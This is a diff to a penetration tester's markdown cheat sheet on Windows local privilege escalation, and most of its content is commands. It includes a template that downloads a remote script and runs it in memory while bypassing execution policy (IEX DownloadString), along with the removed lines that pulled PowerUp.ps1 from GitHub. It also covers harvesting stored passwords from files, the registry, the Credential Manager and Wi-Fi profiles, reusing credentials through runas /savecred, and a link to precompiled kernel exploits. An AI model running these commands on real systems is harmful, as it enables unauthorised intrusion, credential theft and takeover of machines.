@@ -23,14 +23,14 @@ current system:
 | **Hostname**  | hostname | $env:ComputerName<br/>(Get-WmiObject Win32_ComputerSystem).Name ||
 | **Curent Domain** | echo %userdomain% | $env:UserDomain<br/>(Get-WmiObject Win32_ComputerSystem).Domain ||
 | **Curent User**  | whoami /all<br/>net user %username%  | $env:UserName<br/>(Get-WmiObject Win32_ComputerSystem).UserName | |
-| **List host local users**  | net users |  | wmic USERACCOUNT list full |
-| **List host local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
-| **Local admin users** | net localgroup Administrators | | |
+| **Local users**  | net users<br/>net users <USERNAME\> |  | wmic USERACCOUNT list full |
+| **Local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
+| **Local group users** | net localgroup Administrators<br/>net localgroup <GROUPNAME\> | | |
 | **Connected users** | qwinsta | | |
 | **Powershell version**  | Powershell  $psversiontable | $psversiontable ||
 | **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
 | **Credential Manager** | cmdkey /list | | |
-| **Mounted disks** | | | wmic volume get DriveLetter,FileSystem,Capacity |
+| **Mounted disks** | | Get-PSDrive &#124; where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | wmic volume get DriveLetter,FileSystem,Capacity |
 | **Writable directories** | dir /a-rd /s /b | | |
 | **Writable files** | dir /a-r-d /s /b | | | |
 
@@ -38,12 +38,28 @@ current system:
 
 Most of the enumeration process detailed below can be automated using scripts.
 
-To upload the scripts on the target, please refer to the [General] File transfer
-note. Note that PowerShell scripts can be injected directly into memory.
-
 *Personal preference: PowerSploit's `PowerUp.ps1` `Invoke-PrivescAudit` /
 `Invoke-AllChecks` + enjoiz's `privesc.bat` or `privesc.ps1` + off-target
 `windows-exploit-suggester`*
+
+To upload the scripts on the target, please refer to the [General] File transfer
+note.
+
+Note that PowerShell scripts can be injected directly into memory using
+PowerShell `DownloadString` or through a `meterpreter` session:
+
+```
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>'); <Invoke-CMD>"
+
+PS> IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>')
+PS> <Invoke-CMD>
+
+meterpreter> load powershell
+meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_execute <Invoke-CMD>
+```
+
+*PowerSploit's PowerUp*
 
 The **PowerSploit's PowerUp** `Invoke-PrivescAudit` / `Invoke-AllChecks` and
 enjoiz's `privesc.bat` or `privesc.ps1`scripts run a number of configuration
@@ -55,26 +71,35 @@ checks:
   - Token privileges
   - ...
 
-The PowerShell scripts can be loaded directly in memory using PowerShell
-`DownloadString` or through a `meterpreter` session:
+The `Invoke-PrivescAudit` / `Invoke-AllChecks` cmdlets will run all the checks
+implemented by PowerSploit's `PowerUp.ps1`. The script can be either injected
+directly into memory as specified above or can be imported using the file.
 
 ```
-powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1’); Invoke-AllChecks”
-powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1’); Invoke-Privesc”
+# powershell.exe -nop -exec bypass
+# set-executionpolicy bypass
 
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
-PS> Invoke-AllChecks
-PS> IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1’)
-PS> Invoke-Privesc
+Import-Module <FULLPATH>\PowerUp.ps1
 
-meterpreter> load powershell
-meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
-meterpreter> powershell_execute Invoke-AllChecks
-meterpreter> powershell_import <PRIVESC_PS1_FILE_PATH>
-meterpreter> powershell_execute Invoke-Privesc
+# Older versions
+Invoke-AllChecks
+
+Invoke-PrivescAudit
 ```
+
+*enjoiz privesc.bat / privesc.ps1*
+
+Both the batch and PowerShell versions of the enjoiz privilege escalation script
+require `accesschk.exe` to present on the targeted machine (on the script
+directory). The script takes one or multiple user group(s) as parameter to
+test the configuration for. To retrieve the user groups of the compromised user,
+the Windows built-in `whoami /groups` can be used.
+
+```
+privesc.bat "<USER_GROUP_1>" ["<USER_GROUP_N"]
+
+privesc.bat "Everyone Users" "Authenticated Users"
+```   
 
 The **windows-exploit-suggester** script compares a targets patch levels against
 the Microsoft vulnerability database in order to detect potential missing
@@ -157,7 +182,7 @@ The procedure to do so is as follow:
   9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
   user
 
-### Clear text passwords
+### Clear text passwords and files of interest
 
 ###### Clear text passwords in files
 
@@ -169,6 +194,9 @@ The `meterpreter` `search` command can be used in place of `findstr` if a
 `meterpreter` shell is being used.
 
 ```
+# Searche recursively in current folder
+dir /s <KEYWORD>
+
 # Meterpreter search command
 search -f <FILENAME>.<FILE_EXTENSION> <KEYWORD>
 search -f *.* <KEYWORD>
@@ -225,14 +253,45 @@ dir /s /b *tnsnames*
 dir /s /b *.ora*
 ```
 
-###### Clear text password in registry
+###### Cached credentials
 
-Passwords may also be stored in registry:
+Windows-based computers use multiple forms of password caching / storage: local
+accounts credentials, domain credentials, and generic credentials:
+
+  - Domain credentials are authenticated by the Local Security Authority (LSA)
+    and cached in the LSASS (Local Security Authority Subsystem) process.
+  - Local accounts credentials are stored in the SAM (Security Account Manager)
+    hive.
+  - Generic credentials are defined and authenticated by programs that manage
+    authorization and security directly. The generic credentials are cached in
+    the Credential Manager.
+
+Local administrator or NT AUTHORITY\SYSTEM privileges are required to access
+the clear-text or hashed passwords. Refer to the `[Windows] Post
+Exploitation` note for more information on how to retrieve these credentials.
+
+However, stored generic credentials may be directly usable. In particular,
+Windows credentials (domain or local accounts) cached as generic credentials in
+the Credential Manager, usually done using `runas /savecred`.   
+
+The `cmdkey` and `rundll32.exe` Windows built-ins can be used to enumerate the
+generic credentials stored on the machine. Saved Windows credentials be can used
+using `runas`.
 
 ```
-# runas
+# List stored generic credentials
+cmdkey /list
+# Require a GUI interface
 rundll32.exe keymgr.dll,KRShowKeyMgr
 
+runas /savecred /user:<DOMAIN | WORKGROUP>\<USERNAME> <EXE>
+```
+
+###### Clear text password in registry
+
+Passwords may also be stored in Windows registry:
+
+```
 # VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
@@ -251,6 +310,19 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f pass /t REG_SZ /s
 reg query HKCU /f pass /t REG_SZ /s
+```
+
+###### Wifi passwords
+
+The configured / memorized Wifi passwords on the target machine may be
+retrievable as an unprivileged user using the Windows built-in `netsh`:
+
+```
+# List stored Wifi
+netsh wlan show profiles
+
+# Retrieve information about the specified Wifi, including its clear text password if available
+netsh wlan show profile name="<WIFI_NAME>" key=clear
 ```
 
 ###### Hidden files
@@ -345,6 +417,14 @@ msf > use post/multi/recon/local_exploit_suggester
 msf post(local_exploit_suggester) > set SESSION <session-id>
 msf post(local_exploit_suggester) > run
 ```
+###### Pre compiled exploits
+
+A collection of pre compiled Windows kernel exploits can be found on the
+`windows-kernel-exploits` GitHub repository. Use at your own risk.
+
+```
+https://github.com/SecWiki/windows-kernel-exploits
+```
 
 ###### Compilers
 
@@ -386,6 +466,17 @@ manually or when an event occur.
 Vulnerabilities in a service configuration could be exploited to execute code
 under the privileges of the user starting the service, often
 NT AUTHORITY\SYSTEM.
+
+###### Services enumeration
+
+The Windows built-in `sc` can be used to enumerate the services configured on the
+target:
+
+```
+sc query
+
+sc qc <SERVICENAME>
+```
 
 ###### Weak services permissions
 
@@ -488,11 +579,6 @@ script can be used as well as a manual review of each service metadata using
 `sc` queries:
 
 ```
-# List services
-sc query
-# Specified service metadata
-sc qc <SERVICENAME>
-
 # wmic
 wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
 wmic service get PathName, StartMode | findstr /i /v """
@@ -726,11 +812,11 @@ psexec.exe -accepteula -s -i -d cmd.exe
 If a `meterpreter` shell is being used, the `getsystem` command can be
 leveraged to the same end.
 
-### Scheduled tasks
-
 ### TODO
 
-###### Process and installed programs
+### Scheduled tasks
+
+### Process and installed programs
 
 The following commands can be used to retrieve the process, services,
 installed programs and scheduled tasks of the host:
@@ -738,13 +824,3 @@ installed programs and scheduled tasks of the host:
 |  | DOS | Powershell | WMI |
 |--|-----|------------|-----|
 | **Process** | tasklist | Get-Process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |
-
-###### Network
-
-The following commands can be used to retrieve information about the network
-interfaces and active connections of the host:
-
-|  | DOS | Powershell | WMI |
-|--|-----|------------|-----|
-| Network interfaces | ipconfig | | |
-| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
